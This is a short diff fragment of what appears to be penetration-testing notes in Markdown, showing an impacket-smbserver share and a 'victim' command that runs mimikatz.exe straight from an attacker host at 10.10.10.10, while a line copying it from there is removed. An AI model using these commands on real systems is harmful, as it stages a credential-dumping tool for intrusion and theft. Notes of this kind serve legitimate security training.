@@ -76,6 +76,4 @@ impacket-smbserver share .
 
 # From victim
 \\10.10.10.10\share\mimikatz.exe 
-
-copy \\10.10.10.10\share\mimikatz.exe 
 ```
